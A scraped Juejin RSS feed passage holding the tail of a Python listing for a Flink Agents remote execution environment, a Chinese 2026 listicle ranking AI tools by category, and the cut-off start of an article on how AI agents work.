        env: StreamExecutionEnvironment,
        t_env: StreamTableEnvironment | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
    </span>) -&gt; <span class="hljs-literal">None</span>:
        <span class="hljs-string">"""Init method of RemoteExecutionEnvironment."""</span>
        <span class="hljs-built_in">super</span>().__init__()
        self.__env = env
        self.__t_env = t_env
        self.__config = AgentConfiguration()
        self.__load_config_from_flink_conf_dir()

    @<span class="hljs-built_in">property</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">t_env</span>(<span class="hljs-params">self</span>) -&gt; StreamTableEnvironment:
        <span class="hljs-string">"""Get or crate table environment."""</span>
        <span class="hljs-keyword">if</span> self.__t_env <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:
            self.__t_env = StreamTableEnvironment.create(
                stream_execution_environment=self.__env
            )
        <span class="hljs-keyword">return</span> self.__t_env

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_config</span>(<span class="hljs-params">self, path: <span class="hljs-built_in">str</span> | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span></span>) -&gt; AgentConfiguration:
        <span class="hljs-string">"""Get the writable configuration for flink agents.

        Returns:
        -------
        LocalConfiguration
            The configuration for flink agents.
        """</span>
        <span class="hljs-keyword">return</span> self.__config

    @<span class="hljs-built_in">staticmethod</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__process_input_datastream</span>(<span class="hljs-params">
        <span class="hljs-built_in">input</span>: DataStream, key_selector: KeySelector | <span class="hljs-type">Callable</span> | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>
    </span>) -&gt; KeyedStream:
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">input</span>, KeyedStream):
            <span class="hljs-keyword">return</span> <span class="hljs-built_in">input</span>
        <span class="hljs-keyword">else</span>:
            <span class="hljs-keyword">if</span> key_selector <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:
                msg = <span class="hljs-string">"KeySelector must be provided."</span>
                <span class="hljs-keyword">raise</span> RuntimeError(msg)
            <span class="hljs-built_in">input</span> = <span class="hljs-built_in">input</span>.key_by(key_selector)
            <span class="hljs-keyword">return</span> <span class="hljs-built_in">input</span>

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">from_datastream</span>(<span class="hljs-params">
        self, <span class="hljs-built_in">input</span>: DataStream, key_selector: KeySelector | <span class="hljs-type">Callable</span> | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>
    </span>) -&gt; RemoteAgentBuilder:
        <span class="hljs-string">"""Set input datastream of agent.

        Parameters
        ----------
        input : DataStream
            Receive a DataStream as input.
        key_selector : KeySelector
            Extract key from each input record, must not be None when input is
            not KeyedStream.
        """</span>
        <span class="hljs-built_in">input</span> = self.__process_input_datastream(<span class="hljs-built_in">input</span>, key_selector)

        <span class="hljs-keyword">return</span> RemoteAgentBuilder(
            <span class="hljs-built_in">input</span>=<span class="hljs-built_in">input</span>,
            config=self.__config,
            t_env=self.__t_env,
            resources=self.resources,
        )

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">from_table</span>(<span class="hljs-params">
        self,
        <span class="hljs-built_in">input</span>: Table,
        key_selector: KeySelector | <span class="hljs-type">Callable</span> | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
    </span>) -&gt; AgentBuilder:
        <span class="hljs-string">"""Set input Table of agent.

        Parameters
        ----------
        input : Table
            Receive a Table as input.
        key_selector : KeySelector
            Extract key from each input record.
        """</span>
        <span class="hljs-built_in">input</span> = self.t_env.to_data_stream(table=<span class="hljs-built_in">input</span>)

        <span class="hljs-built_in">input</span> = <span class="hljs-built_in">input</span>.<span class="hljs-built_in">map</span>(<span class="hljs-keyword">lambda</span> x: x, output_type=PickledBytesTypeInfo())

        <span class="hljs-built_in">input</span> = self.__process_input_datastream(<span class="hljs-built_in">input</span>, key_selector)
        <span class="hljs-keyword">return</span> RemoteAgentBuilder(
            <span class="hljs-built_in">input</span>=<span class="hljs-built_in">input</span>,
            config=self.__config,
            t_env=self.t_env,
            resources=self.resources,
        )

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">from_list</span>(<span class="hljs-params">self, <span class="hljs-built_in">input</span>: <span class="hljs-type">List</span>[<span class="hljs-type">Dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-type">Any</span>]]</span>) -&gt; <span class="hljs-string">"AgentsExecutionEnvironment"</span>:
        <span class="hljs-string">"""Set input list of agent execution.

        This method is not supported for remote execution environments.
        """</span>
        msg = <span class="hljs-string">"RemoteExecutionEnvironment does not support from_list."</span>
        <span class="hljs-keyword">raise</span> NotImplementedError(msg)

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">execute</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-literal">None</span>:
        <span class="hljs-string">"""Execute agent."""</span>
        self.__env.execute()


    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__load_config_from_flink_conf_dir</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-literal">None</span>:
        <span class="hljs-string">"""Load agent configuration from FLINK_CONF_DIR if available."""</span>
        flink_conf_dir = os.environ.get(<span class="hljs-string">"FLINK_CONF_DIR"</span>)
        <span class="hljs-keyword">if</span> flink_conf_dir <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:
            <span class="hljs-keyword">return</span>

        <span class="hljs-comment"># Try to find config file, with fallback to legacy name</span>
        config_path = self.__find_config_file(flink_conf_dir)

        <span class="hljs-keyword">if</span> config_path <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:
            logging.error(<span class="hljs-string">f"Config file not found in <span class="hljs-subst">{flink_conf_dir}</span>"</span>)
        <span class="hljs-keyword">else</span>:
            self.__config.load_from_file(<span class="hljs-built_in">str</span>(config_path))

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__find_config_file</span>(<span class="hljs-params">self, flink_conf_dir: <span class="hljs-built_in">str</span></span>) -&gt; Path | <span class="hljs-literal">None</span>:
        <span class="hljs-string">"""Find config file in the given directory, checking both new and legacy names.

        Parameters
        ----------
        flink_conf_dir : str
            Directory to search for config files.

        Returns:
        -------
        Path | None
            Path to the config file if found, None otherwise.
        """</span>
        <span class="hljs-comment"># Try legacy config file name first</span>
        legacy_config_path = Path(flink_conf_dir).joinpath(_LEGACY_CONFIG_FILE_NAME)
        <span class="hljs-keyword">if</span> legacy_config_path.exists():
            logging.warning(
                <span class="hljs-string">f"Using legacy config file <span class="hljs-subst">{_LEGACY_CONFIG_FILE_NAME}</span>"</span>
            )
            <span class="hljs-keyword">return</span> legacy_config_path

        <span class="hljs-comment"># Try new config file name as fallback</span>
        primary_config_path = Path(flink_conf_dir).joinpath(_CONFIG_FILE_NAME)
        <span class="hljs-keyword">if</span> primary_config_path.exists():
            <span class="hljs-keyword">return</span> primary_config_path

        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>
</code></pre>
<h3 data-id="heading-29">0xFF 参考</h3>
<p>本文使用 <a href="https://link.juejin.cn?target=https%3A%2F%2Fmarkdown.com.cn" target="_blank" title="https://markdown.com.cn" ref="nofollow noopener noreferrer">markdown.com.cn</a> 排版</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[建议收藏 | 2026年AI工具封神榜：从Sora到混元3D，生产力彻底爆发]]></title>    <link>https://juejin.cn/post/7595393113553698831</link>    <guid>https://juejin.cn/post/7595393113553698831</guid>    <pubDate>2026-01-15T14:51:58.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595393113553698831" data-draft-id="7595410455223058442" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="建议收藏 | 2026年AI工具封神榜：从Sora到混元3D，生产力彻底爆发"/> <meta itemprop="keywords" content="前端,后端,人工智能"/> <meta itemprop="datePublished" content="2026-01-15T14:51:58.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="柳杉"/> <meta itemprop="url" content="https://juejin.cn/user/4441682708274279"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            建议收藏 | 2026年AI工具封神榜：从Sora到混元3D，生产力彻底爆发
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4441682708274279/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    柳杉
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T14:51:58.000Z" title="Thu Jan 15 2026 14:51:58 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;color:#3c9dff}.markdown-body h1{font-size:30px;margin-bottom:5px;padding-bottom:8px;text-align:center}.markdown-body h2{font-size:24px;padding-bottom:6px}.markdown-body h2:before{content:"🍋"}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h3:before{content:"🍓"}.markdown-body h4{font-size:16px}.markdown-body h4:before{content:"🍑"}.markdown-body h5{font-size:15px}.markdown-body h5:before{content:"🍉"}.markdown-body h6{margin-top:5px}.markdown-body h6:before{content:"🍒"}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{display:block;margin:0 auto;max-width:100%;border-radius:4px;padding:1px;border:1px solid #d2e8ff}.markdown-body img:hover{box-shadow:0 1px 3px #5eaeff}.markdown-body hr{height:4px;margin:34px 0;background-size:4px 1px;background-image:linear-gradient(270deg,#5eaeff,#f3f9ff 25%,transparent 50%);border-style:none}.markdown-body code{word-break:break-word;border-radius:3px;overflow-x:auto;background-color:#d2e8ff;color:#3c9dff;font-size:.9em;padding:.1em .5em;margin:0 3px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace;transition:all .3s}.markdown-body pre{overflow:auto;position:relative;line-height:1.75;border:1px solid #90c7ff;border-radius:4px}.markdown-body pre:hover{box-shadow:0 1px 10px #beddff}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#3c9dff;border-bottom:1px solid #90c7ff;transition:all .3s}.markdown-body a:hover{color:#007fff;border-bottom:2px solid #5eaeff}.markdown-body a[href]:not(:empty){padding-right:18px}.markdown-body a[href]:not(:empty):after{display:inline-block;width:16px;height:16px;margin-left:2px;content:"";background:url(data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iaWNvbiIgdmlld0JveD0iMCAwIDEwMjQgMTAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iMTYiIGhlaWdodD0iMTYiPjxwYXRoIGQ9Ik0zODQgMTI4YTQ4IDQ4IDAgMDEyLjgxNiA5NS45MkwzODQgMjI0SDI1NmEzMiAzMiAwIDAwLTMxLjkyIDI5LjZMMjI0IDI1NnY1MTJhMzIgMzIgMCAwMDI5LjYgMzEuOTJsMi40LjA4aDUxMmEzMiAzMiAwIDAwMzEuOTItMjkuNmwuMDgtMi40VjY1NmE0OCA0OCAwIDAxOTUuOTItMi44MTZMODk2IDY1NnYxMTJhMTI4IDEyOCAwIDAxLTEyNCAxMjcuOTM2bC00IC4wNjRIMjU2YTEyOCAxMjggMCAwMS0xMjcuOTM2LTEyNGwtLjA2NC00VjI1NmExMjggMTI4IDAgMDExMjQtMTI3LjkzNmw0LS4wNjRoMTI4em0zODQgMGExMjggMTI4IDAgMDExMjcuOTM2IDEyNGwuMDY0IDR2MTYwYTQ4IDQ4IDAgMDEtOTUuOTIgMi44MTZMODAwIDQxNlYyOTEuODcybC0zODIuMDY0IDM4Mi4wOGE0OCA0OCAwIDAxLTcwLjAzMi02NS42bDIuMTYtMi4yODhMNzMyLjA5NiAyMjRINjA4YTQ4IDQ4IDAgMDEtMi44MTYtOTUuOTJMNjA4IDEyOGgxNjB6IiBmaWxsPSIjM2M5ZGZmIiBmaWxsLW9wYWNpdHk9Ii41NiIgZGF0YS1zcG0tYW5jaG9yLWlkPSJhMzEzeC5zZWFyY2hfaW5kZXguMC5pMC41Yzc1M2E4MTgwa2RKWCIgY2xhc3M9InNlbGVjdGVkIi8+PC9zdmc+);background-size:100%}.markdown-body table{margin:0 auto 10px;font-size:12px;width:auto;max-width:100%;overflow:auto;border-collapse:collapse;border:1px solid #3c9dff}.markdown-body thead{text-align:center}.markdown-body thead th{color:#fff;background-color:#5eaeff}.markdown-body tr{text-align:center}.markdown-body tbody tr:hover{background-color:#d2e8ff}.markdown-body tbody tr:hover code{background-color:#90c7ff}.markdown-body tr:nth-child(2n){background-color:#ecf5ff}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#5eaeff}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body b,.markdown-body strong{font-weight:900;padding:0 1px;font-size:17px}.markdown-body small{color:#cbcbcb;padding:0 1px;font-size:22px;zoom:.5}.markdown-body em{padding:0 1px}.markdown-body del{padding:0 1px;text-decoration-thickness:2px}.markdown-body blockquote{color:#1a1b1c;padding:1px 20px;margin:22px 0;border-radius:4px;border-left:4px solid rgba(60,157,255,.5);background-color:rgba(190,221,255,.3)}.markdown-body blockquote blockquote{margin:8px 0}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body details{margin:12px 0;padding:4px 10px;border:2px solid #3c9dff;border-radius:8px;background-color:#ecf5ff;transition:all .3s}.markdown-body details summary{cursor:pointer}.markdown-body input[type=checkbox]{position:relative;appearance:none;width:16px;height:16px;border-radius:2px;vertical-align:middle;transform:translateY(-2px);box-sizing:border-box;border:1px solid #beddff}.markdown-body input[type=checkbox]:checked{border:1px solid #5eaeff;background-color:#5eaeff}.markdown-body input[type=checkbox]:checked:before{position:absolute;top:3px;left:1px;width:11px;height:6px;background-color:transparent;border-left:2px solid #fff;border-bottom:2px solid #fff;transform:rotate(-45deg);content:"";box-sizing:border-box}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="androidstudio">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#a9b7c6;background:#282b2e}.hljs-bullet,.hljs-literal,.hljs-number,.hljs-symbol{color:#6897bb}.hljs-deletion,.hljs-keyword,.hljs-selector-tag{color:#cc7832}.hljs-link,.hljs-template-variable,.hljs-variable{color:#629755}.hljs-comment,.hljs-quote{color:grey}.hljs-meta{color:#bbb529}.hljs-addition,.hljs-attribute,.hljs-string{color:#6a8759}.hljs-section,.hljs-title,.hljs-type{color:#ffc66d}.hljs-name,.hljs-selector-class,.hljs-selector-id{color:#e8bf6a}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">建议收藏 | 2026年AI工具封神榜：从Sora到混元3D，生产力彻底爆发</h2>
<p>整理了整整一周，这份涵盖 <strong>LLM、绘图、视频、编程、3D</strong> 等8大领域的AI工具清单.</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/862babbfcef84111b8dfa06036df67fc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p-z5p2J:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769093518&amp;x-signature=olkBtcUu0caML5T8lJx9C2JY9a8%3D" alt="截屏2026-01-15 22.47.18.png" loading="lazy"/></p>
<p><strong>导航链接</strong>：<a href="https://link.juejin.cn?target=https%3A%2F%2Fliush.top%2Fai.html" target="_blank" title="https://liush.top/ai.html" ref="nofollow noopener noreferrer">liush.top/ai.html</a></p>
<h3 data-id="heading-1">01 LLM 大语言模型</h3>
<ul>
<li>
<p>Gemini Pro (GM3 Pro) 生产力</p>
<p>推荐理由：100万token上下文，支持多模态输入（图片/音频/视频），适合深度研究与生产力。</p>
<p>★ 会员可解锁 Notebook LM 等高级工具</p>
</li>
<li>
<p>豆包 (Doubao) 新手推荐</p>
<p>推荐理由：免费、响应快，拥有Gemini约80%的能力，适合日常查询，AI版百度。</p>
</li>
</ul>
<h3 data-id="heading-2">02 图像生成 AI</h3>
<ul>
<li>
<p>Mid Journey V7 画质王</p>
<p>推荐理由：审美与出图质量最佳，适合高质量艺术图、壁纸、概念设计。</p>
</li>
<li>
<p>Nano Banana Pro 谷歌绘图</p>
<p>推荐理由：全能型绘图AI，适用于电商设计、科研绘图，被称为“绘图王者”。</p>
</li>
<li>
<p>Stable Diffusion + ComfyUI 专业级</p>
<p>推荐理由：专业设计师首选，支持精细化控制，适合需频繁修改的甲方项目。</p>
</li>
<li>
<p>我的AI (My AI平台) 聚合</p>
<p>推荐理由：集成多种绘图模型，自动调用最适合的AI，懂工作流的设计智能体。</p>
</li>
</ul>
<h3 data-id="heading-3">03 视频生成 AI</h3>
<ul>
<li>
<p>可灵 (Kling) 国产之光</p>
<p>推荐理由：国产优秀模型，角色一致性好，中文对白强，适合短剧创作。</p>
</li>
<li>
<p>Sora 2 (OpenAI) 物理模拟</p>
<p>推荐理由：擅长模拟物理世界，适合科研演示、复杂碰撞效果，接近真实模拟。</p>
</li>
<li>
<p>VEO 3.1 (Google) 全能</p>
<p>推荐理由：六边形战士，画质高、运镜自然，仅中文语音稍弱。</p>
</li>
<li>
<p>Runway (Gen-3) 影视级</p>
<p>推荐理由：广告片与微电影制作利器，强于镜头语言控制。</p>
</li>
<li>
<p>极梦/可零/微度 平价</p>
<p>推荐理由：面向普通用户的短视频生成工具，价格亲民，适合轻量级创作。</p>
</li>
</ul>
<h3 data-id="heading-4">04代码与程序生成</h3>
<ul>
<li>
<p>Cursor 开发者必备</p>
<p>推荐理由：最全面的AI编程IDE，适合懂代码的专业开发者深入使用。</p>
</li>
<li>
<p>Cloud Code 企业级</p>
<p>推荐理由：企业级开发常用，常与Cursor组合使用，提升团队效率。</p>
</li>
<li>
<p>Web (web.coding.ai) 无代码</p>
<p>推荐理由：专为“直觉编程”设计，只需描述需求即可生成网页或应用。</p>
</li>
<li>
<p>Google AI Studio 原型</p>
<p>推荐理由：Gemini会员可使用Build功能，适合快速构建原型页面。</p>
</li>
<li>
<p>豆包编程 免费</p>
<p>推荐理由：少有的免费AI编程工具，适合产品经理或零基础做演示。</p>
</li>
</ul>
<h3 data-id="heading-5">05 音频与音乐生成</h3>
<ul>
<li>
<p>Suno V5 音乐霸主</p>
<p>推荐理由：唯一档的AI音乐生成怪物，音质和人声真实度极高。</p>
</li>
<li>
<p>Sono Studio 专业制作</p>
<p>推荐理由：Suno旗下，支持分轨编辑（主唱/吉他/鼓组独立控制）。</p>
</li>
</ul>
<h3 data-id="heading-6">06 数字人与口播</h3>
<ul>
<li>
<p>爱说数字人 自媒体</p>
<p>推荐理由：适合克隆形象做口播自媒体，国内可用性强。</p>
</li>
<li>
<p>HeyGen (黑简简) 跨境</p>
<p>推荐理由：跨境场景首选，提供多国模特资源，适合国际推广。</p>
</li>
<li>
<p>禅境数字人 电商</p>
<p>推荐理由：专注电商场景，可用于商品展示与带货口播。</p>
</li>
</ul>
<h3 data-id="heading-7">07 3D模型生成</h3>
<ul>
<li>
<p>腾讯混元3D 国产强力</p>
<p>推荐理由：腾讯出品的3D大模型，支持文/图生3D，模型结构优秀，生成素材可用性高。</p>
</li>
<li>
<p>Tripo AI 快速生成</p>
<p>推荐理由：生成速度极快，支持文本和图像转3D，生成的模型自带骨骼绑定。</p>
</li>
<li>
<p>Rodin (Deemos) 专业级</p>
<p>推荐理由：国产顶尖3D大模型，生成的模型拓扑结构优秀，支持PBR材质，适合专业工作流。</p>
</li>
<li>
<p>Luma Genie 高保真</p>
<p>推荐理由：Luma AI出品，从文本或图片快速生成高保真3D模型，广泛用于游戏开发。</p>
</li>
<li>
<p>Meshy 游戏资产</p>
<p>推荐理由：专注于游戏资产生成的AI工具，能够快速生成带纹理的3D模型。</p>
</li>
</ul>
<h3 data-id="heading-8">08 辅助与工作流</h3>
<ul>
<li>
<p>Notebook LM 知识库</p>
<p>推荐理由：人生作弊系统，具备输入检索、思考处理、总结输出，整合知识。</p>
</li>
<li>
<p>N8N 自动化</p>
<p>推荐理由：自动化工作流平台，适合搭建复杂AI任务流水线，功能强大。</p>
</li>
<li>
<p>Prompt Hero / Base 提示词</p>
<p>推荐理由：寻找AI绘画提示词灵感的社区平台。</p>
</li>
<li>
<p>Proud Pilot 进阶</p>
<p>推荐理由：用于生成、优化提示词，建立评测体系，适合进阶用户。</p>
</li>
<li>
<p>商意见 商业</p>
<p>推荐理由：商家冷启动神器，集成账号诊断、内容写作、数字人、Auto CRM等功能。</p>
</li>
<li>
<p>Latest Box 资讯</p>
<p>推荐理由：前沿AI工具聚合站，可视化圆饼图呈现技术分布。</p>
</li>
<li>
<p>Web作者教程 教程</p>
<p>推荐理由：将AI编程方法系统化整理，适合新手入门。</p>
</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[深入解析：AI 智能体（Agent）是如何解决问题的？]]></title>    <link>https://juejin.cn/post/7595410455223074826</link>    <guid>https://juejin.cn/post/7595410455223074826</guid>    <pubDate>2026-01-15T15:03:54.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595410455223074826" data-draft-id="7594680314713391154" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="深入解析：AI 智能体（Agent）是如何解决问题的？"/> <meta itemprop="keywords" content="Agent,AI编程,前端"/> <meta itemprop="datePublished" content="2026-01-15T15:03:54.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="candyTong"/> <meta itemprop="url" content="https://juejin.cn/user/2242659449576952"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            深入解析：AI 智能体（Agent）是如何解决问题的？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2242659449576952/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    candyTong
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T15:03:54.000Z" title="Thu Jan 15 2026 15:03:54 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body 